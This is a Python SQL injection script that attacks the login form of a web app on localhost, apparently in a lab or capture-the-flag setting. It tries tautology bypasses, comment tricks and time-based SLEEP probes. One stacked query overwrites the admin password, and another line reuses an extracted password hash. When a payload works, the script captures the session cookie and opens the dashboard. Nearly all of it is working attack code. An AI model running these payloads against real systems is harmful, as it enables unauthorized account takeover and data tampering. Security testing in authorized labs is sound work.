import requests
import urllib.parse

# Target information
target_url = "http://127.0.0.1:33038/index.php"
dashboard_url = "http://127.0.0.1:33038/dashboard.php"

# More advanced SQL injection payloads to try
advanced_payloads = [
    # Try matching actual admin row with password field manipulation
    "admin' AND 1=1 -- -",
    "admin' AND 1=2 -- -",
    
    # Try to make password check always true
    "admin' OR password=password -- -",
    "admin' OR '1'='1' AND username='admin' -- -",
    
    # Try commenting out AND password part
    "admin'/*'*/AND password='hash' -- -",
    
    # Try stacked queries if supported
    "admin'; UPDATE users SET password='test' WHERE username='admin'; -- -",
    
    # Try using the actual password hash that was extracted
    "admin' AND password='7d39307ae824e70052c0aa16816a9b16' -- -",
    
    # Try bypassing with NULL or empty password check
    "admin' OR password IS NULL -- -",
    "admin' OR password='' -- -",
    
    # Try time-based to see if we can infer different behavior
    "admin' AND SLEEP(5) -- -",
    "' OR SLEEP(5) -- -",
    
    # Try multi-line comment trick
    "admin'\nOR\n'1'='1",
    
    # Try using backticks
    "`admin` -- -",
    "admin` -- -",
]

print("[*] Advanced SQLi Authentication Bypass Testing")
print(f"[*] Target: {target_url}")
print()

# Let's also try sending with actual password field variations
special_tests = [
    # Test with empty password
    {"username": "admin' -- -", "password": ""},
    {"username": "admin' -- -", "password": "admin"},
    {"username": "admin' OR '1'='1' -- -", "password": ""},
    {"username": "' OR '1'='1' -- -", "password": ""},
    
    # Try with password field as true condition
    {"username": "admin", "password": "' OR '1'='1' -- -"},
    {"username": "admin", "password": "' OR 1=1 -- -"},
    {"username": "admin", "password": "admin' -- -"},
]

# First test the special combinations
print("[*] Phase 1: Testing username+password combination injections")
for test_data in special_tests:
    print(f"\n[!] Testing: username='{test_data['username']}' | password='{test_data['password']}'")
    
    data = {
        'username': test_data['username'],
        'password': test_data['password'],
        'submit': 'Login'
    }
    
    try:
        response = requests.post(
            target_url,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
            timeout=10
        )
        
        print(f"  Status: {response.status_code}")
        print(f"  Response: {response.text}")
        
        # Check for cookies
        cookies = response.cookies
        if cookies.get('PHPSESSID'):
            print(f"  [!!!] PHPSESSID RECEIVED: {cookies.get('PHPSESSID')}")
        
        # Check for redirect
        if 300 <= response.status_code < 400:
            location = response.headers.get('Location', '')
            print(f"  [!!!] REDIRECT TO: {location}")
            
    except Exception as e:
        print(f"  Error: {str(e)}")

# Then try advanced payloads in username
print("\n" + "="*60)
print("[*] Phase 2: Testing advanced username payloads")
for i, payload in enumerate(advanced_payloads, 1):
    print(f"\n[{i}/{len(advanced_payloads)}] Payload: {payload}")
    
    data = {
        'username': payload,
        'password': 'test_password',
        'submit': 'Login'
    }
    
    try:
        response = requests.post(
            target_url,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
            timeout=10
        )
        
        print(f"  Status: {response.status_code}")
        print(f"  Response: {response.text}")
        
        # Check for cookies
        cookies = response.cookies
        phpsessid = cookies.get('PHPSESSID')
        if phpsessid:
            print(f"\n[!!!] PHPSESSID RECEIVED: {phpsessid}")
            print(f"[!!!] Working payload: {payload}")
            
            # Verify dashboard access
            print("\n[*] Verifying dashboard access...")
            dash = requests.get(
                dashboard_url,
                cookies={'PHPSESSID': phpsessid},
                timeout=10
            )
            print(f"  Dashboard status: {dash.status_code}")
            print(f"  Dashboard content (first 300 char): {dash.text[:300]}")
            break
            
    except Exception as e:
        print(f"  Error: {str(e)}")

print("\n[*] Test complete")
